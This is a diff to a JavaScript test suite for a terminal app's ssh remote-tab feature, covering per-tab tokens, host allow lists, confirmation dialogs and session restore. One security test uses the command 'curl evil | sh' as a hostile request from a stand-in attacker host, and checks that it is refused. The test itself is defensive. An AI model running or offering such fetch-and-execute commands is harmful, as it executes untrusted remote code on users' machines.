@@ -16,7 +16,7 @@ const SHELLS = {
 };
 const SSH = 'C:\\Windows\\System32\\OpenSSH\\ssh.exe';
 const GIT_SSH = 'C:\\Program Files\\Git\\usr\\bin\\ssh.exe';
-const SEND_ENV = ['-t', '-o', 'SendEnv=LC_TERMINAL', '-o', 'SendEnv=LC_TERMINAL_VERSION', '-o', 'SendEnv=LC_KOLONKA_TOKEN'];
+const SEND_ENV = ['-t', '-o', 'SendEnv=LC_TERMINAL', '-o', 'SendEnv=LC_TERMINAL_VERSION', '-o', 'SendEnv=KOLONKA_TOKEN'];
 const b = R.b64encode;
 const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms));
 
@@ -106,6 +106,22 @@ test('without the tab\'s token, an allowed host still needs the dialog, and neve
   assert.deepEqual(model.remoteAllowed, [], 'nothing remembered');
 });
 
+test('the token vouches only for the tab\'s own server: another allowed host still asks', async (t) => {
+  const env = makeModel(t, { settings: { remote: { allowHosts: ['prod', 'evil'] } } });
+  const { model } = env;
+  const tab = sshTab(model, env.dir, 'evil');
+  env.answer('deny');
+  // evil knows the tab's token (it was sent there) and asks for a tab on prod
+  assert.equal(await model.handleRemote(tab, open(tab, { host: 'prod', cmd: 'curl evil | sh' })), undefined);
+  assert.equal(env.asked.length, 1);
+  assert.equal(env.asked[0].verified, true, 'Always is offered: the token is right');
+  assert.equal(env.asked[0].host, 'prod');
+  // naming its own host explicitly is the same as @same
+  model._denyUntil.delete(tab);
+  assert.ok(await model.handleRemote(tab, open(tab, { host: 'evil', cmd: 'htop' })));
+  assert.equal(env.asked.length, 1);
+});
+
 test('allowHosts is compared by the whole user@host:port', async (t) => {
   const env = makeModel(t, { settings: { remote: { allowHosts: ['prod', 'leo@box'] } } });
   const { model } = env;
@@ -131,13 +147,15 @@ test('open from a local tab (no ssh under it) is refused, with a notice; nothing
   assert.deepEqual(env.events.filter((e) => e.type === 'remote.denied').map((e) => e.reason), ['no-ssh', 'not-ssh']);
 });
 
-test('open from a local tab is allowed only with remote.fromLocalTabs, and only for a named host', async (t) => {
+test('open from a local tab is allowed only with remote.fromLocalTabs, for a named host, and always asks', async (t) => {
   const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'], fromLocalTabs: true } } });
   const { model } = env;
   const tab = model.createSession({ cwd: env.dir });
   await model.handleRemote(tab, open(tab, { host: '@same', cmd: 'ls' }));
   assert.equal(env.notices.pop().reason, 'no-ssh', '@same still needs an ssh connection');
+  env.answer('once');
   const s = await model.handleRemote(tab, open(tab, { host: 'myserver', cmd: 'ls' }));
+  assert.equal(env.asked.length, 1, 'a local tab is no server the token could vouch for');
   assert.deepEqual(s.opts.shell.args, [...SEND_ENV, '--', 'myserver', 'ls']);
   assert.equal(s.opts.shell.file, SSH);
 });
@@ -161,6 +179,30 @@ test('an ssh.exe that is not on the allowed list is not used for the new tab', a
   const s = await env.model.handleRemote(tab, open(tab, { host: '@same' }));
   assert.equal(s.opts.shell.file, SSH);
   assert.equal(s.ssh.exe, undefined);
+  assert.equal(s.opts.shell.unsetEnv, undefined);
+});
+
+test('Git\'s ssh.exe is started without MSYS / CYGWIN in its environment (MSYS=noglob changes how it reads quotes)', (t) => {
+  const env = makeModel(t);
+  const s = sshTab(env.model, env.dir, 'myserver', { exe: GIT_SSH });
+  assert.equal(s.opts.shell.file, GIT_SSH);
+  assert.deepEqual(s.opts.shell.unsetEnv, ['MSYS', 'CYGWIN']);
+  assert.equal(s.opts.shell.commandLine, R.sshCommandLine(GIT_SSH, s.opts.shell.args));
+});
+
+test('no ssh.exe Kolonka may start at load or restart: the tab is not started, nothing is looked up on PATH', (t) => {
+  const env = makeModel(t, { sshExe: () => null });
+  fs.writeFileSync(path.join(env.dir, 'state.json'), JSON.stringify({ version: 1, counters: { w: 1, s: 3 }, workspaces: [{ id: 'w1', name: 'main', sessions: [
+    { id: 's1', name: 'a', cwd: env.dir, shell: 'ssh', rerun: true, ssh: { destination: 'myserver', options: [], cmd: '' } },
+  ] }] }));
+  env.model.load();
+  const s = env.model.sessions.get('s1');
+  assert.equal(s.opts.shell.file, null);
+  assert.equal(s.deferred, true);
+  assert.ok(env.logs.some((l) => /no ssh\.exe to start/.test(l)));
+  const r = env.model.restartSession('s1');
+  assert.equal(r.opts.shell.file, null);
+  assert.equal(r.deferred, true);
 });
 
 // ---------- the dialog ----------
@@ -447,6 +489,18 @@ test('save + load round trip of an ssh tab; restart reconnects with the same arg
   assert.deepEqual(r.opts.shell.args, s.opts.shell.args);
   assert.equal(r.rerun, true);
   assert.notEqual(r.token, s.token);
+});
+
+test('the chain a tab opened by a server belongs to survives a restart of Kolonka', async (t) => {
+  const env = makeModel(t, { settings: { remote: { allowHosts: ['myserver'] } } });
+  env.model.load();
+  const tab = sshTab(env.model, env.dir);
+  const child = await env.model.handleRemote(tab, open(tab, { host: '@same' }));
+  env.model.saveNow();
+  const again = makeModel(t, { dir: env.dir, settings: { remote: { allowHosts: ['myserver'] } } });
+  again.model.load();
+  assert.equal(again.model.sessions.get(child.id).remoteRoot, tab.id);
+  assert.equal(again.model.sessions.get(child.id).fromRemote, true);
 });
 
 test('createSession refuses an ssh spec with unsafe options (the HTTP API passes it through)', (t) => {
